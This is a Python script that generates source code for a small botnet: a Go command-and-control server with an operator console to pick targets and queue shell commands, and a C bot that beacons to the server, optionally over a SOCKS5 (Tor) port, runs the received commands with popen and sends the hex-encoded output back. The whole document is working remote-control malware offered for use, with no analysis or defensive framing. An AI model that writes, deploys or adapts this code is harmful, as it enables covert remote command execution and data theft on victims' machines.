SERVER_FNAME = "server.go"
CLIENT_FNAME = "bot.c"

MAX_CONN_SIZE = (1 << 6) # (2^6) = 64

URL_ACTION = "/cmd"
IS_SOCKS5_CONNECT = False

ADDR = "127.0.0.1"
PORT = 8080
SOCKS5_PORT = 9050

def main():
	with open(SERVER_FNAME, "w") as file:
		file.write(SERVER_CODE)

	with open(CLIENT_FNAME, "w") as file:
		file.write(CLIENT_CODE)

SERVER_CODE = """
package main

import (
	"os"
	"fmt"
	"time"
	"sync"
	"bufio"
	"strings"
	"net/http"
	"encoding/hex"
	"encoding/json"
)

const (
	TMAXSIZE = """ + f"{MAX_CONN_SIZE}" + """
)

var (
	Mutex sync.Mutex
	Target = "NULL"
	Command = "NULL"
	ListTargets = make(map[string]time.Time)
)

func main() {
	fmt.Println("Server is listening...\\n")
	go adminConsole()
	http.HandleFunc("/", indexPage)
	http.HandleFunc(""" + f"\"{URL_ACTION}\"" + """, cmdPage)
	http.ListenAndServe(""" + f"\":{PORT}\"" + """, nil)
}

func help() string {
	return `
1. exit // exit from program
2. help // help info for commands
3. targ // set target by uid
4. cmnd // set command to target
5. list // get list of targets
`
}

func adminConsole() {
	var (
		message string
		splited []string
	)
	for {
		message = inputString("> ")
		splited = strings.Split(message, " ")
		switch splited[0] {
		case "exit":
			os.Exit(0)
		case "help":
			fmt.Println(help())
		case "targ":
			if len(splited) != 2 {
				fmt.Printf("target = '%s'\\n\\n", Target)
				continue
			}
			Target = splited[1]
			fmt.Println("target set\\n")
		case "list":
			Mutex.Lock()
			i := 1
			for targv, timet := range ListTargets {
				if time.Now().Sub(timet) > (3 * time.Minute) {
					delete(ListTargets, targv)
					continue
				}
			}
			for targv := range ListTargets {
				fmt.Println(i, targv)
				i++
			}
			fmt.Println()
			Mutex.Unlock()
		case "cmnd":
			Command = strings.Join(splited[1:], " ")
		default:
			fmt.Println("error: command undefined\\n")
		}
	}
}

func inputString(begin string) string {
	fmt.Print(begin)
	msg, _ := bufio.NewReader(os.Stdin).ReadString('\\n')
	return strings.Replace(msg, "\\n", "", 1)
}

func indexPage(w http.ResponseWriter, r *http.Request) {
    response(w, 0, "success: action completed")
}

func cmdPage(w http.ResponseWriter, r *http.Request) {
	var req struct {
        Body []string `json:"body"`
    }

    if r.Method != "POST" {
        response(w, 1, "error: method != POST")
        return
    }
    err := json.NewDecoder(r.Body).Decode(&req)
    if err != nil {
        response(w, 2, "error: parse json")
        return
    }
    if len(req.Body) != 2 {
    	response(w, 3, "error: len req != 2")
    	return
    }
    if len(req.Body[0]) != 32 {
    	response(w, 4, "error: len name != 32")
    	return
    }

    target := req.Body[0]
    result := req.Body[1]

    Mutex.Lock()
    if len(ListTargets) > TMAXSIZE {
    	ListTargets = make(map[string]time.Time)
    }
    ListTargets[target] = time.Now()
    Mutex.Unlock()

    if result != "" && Target == target {
    	fmt.Printf("\\n%s\\n> ", string(hexDecode(result)))
    }

	count := 5
	result = "NULL"

repeat:
	if (Target == target && Command != "NULL") || count == 0 {
		goto close
	}
	count--
	time.Sleep(5 * time.Second)
	goto repeat
close:
	if Target == target {
		result = Command
		Command = "NULL"
	}

	response(w, 0, result)
}

func hexDecode(data string) []byte {
    res, err := hex.DecodeString(data)
    if err != nil {
        return nil
    }
    return res
}

func response(w http.ResponseWriter, ret int, res string) {
	w.Header().Set("Content-Type", "application/json")
	var resp struct {
		Return int    `json:"return"`
		Result string `json:"result"`
	}
	resp.Return = ret
	resp.Result = res
	json.NewEncoder(w).Encode(resp)
}
"""

CLIENT_CODE = """
#include "extclib/net.h"
#include "extclib/crypto.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFSIZ_1K (1 << 10)
#define BUFSIZ_2K (2 << 10)

#define BUFSIZ_2M (2 << 20)
#define BUFSIZ_4M (4 << 20)
#define BUFSIZ_8M (8 << 20)

#define NICKSIZE 32
#define ADDRESS  """ + (f"\"{ADDR}\", {PORT}, {SOCKS5_PORT}" if IS_SOCKS5_CONNECT else f"\"{ADDR}\", {PORT}") + """

static char buffer[BUFSIZ_8M];
static char result[BUFSIZ_4M];

int main(void) {
	char command[BUFSIZ_2K] = "NULL";
	char nickname[NICKSIZE+1];
	char inputs[BUFSIZ_1K];

	net_conn *conn;
	FILE *pipe;
	char *ptr;
	int ret;

	crypto_rand(buffer, NICKSIZE/2);
	crypto_hex(1, nickname, NICKSIZE+1, buffer, NICKSIZE/2);

	snprintf(inputs, BUFSIZ_1K, "{\\"return\\":%%d,\\"result\\":\\"%%%d[^\\"]\\"}", BUFSIZ_2K-1);

	while(1) {
		conn = """ + ("net_socks5_connect(ADDRESS);" if IS_SOCKS5_CONNECT else "net_connect(ADDRESS);") + """
		if (conn == NULL) {
			sleep(5);
			continue;
		}

		if (strcmp(command, "NULL") == 0) {
			result[0] = '\\0';
		}

		snprintf(buffer, BUFSIZ_8M, "{\\"body\\":[\\"%s\\", \\"%s\\"]}", nickname, result);
		net_http_post(conn, """ + f"\"{URL_ACTION}\"" + """, buffer);

		ret = net_recv(conn, buffer, BUFSIZ_2M);
		buffer[ret] = '\\0';
		net_close(conn);

		ptr = strstr(buffer, "{");
		if (ptr == NULL) {
			continue;
		}

		ret = -1;
		sscanf(ptr, inputs, &ret, command);
		if (ret != 0) {
			continue;
		}

		if (strcmp(command, "NULL") == 0) {
			continue;
		}

		result[0] = '\\0';
		pipe = popen(command, "r");
		ret = fread(buffer, sizeof(char), BUFSIZ_2M - 1, pipe);
		crypto_hex(1, result, BUFSIZ_4M, buffer, ret);
		pclose(pipe);
	}
	
	return 0;
}
"""

if __name__ == "__main__":
	main()
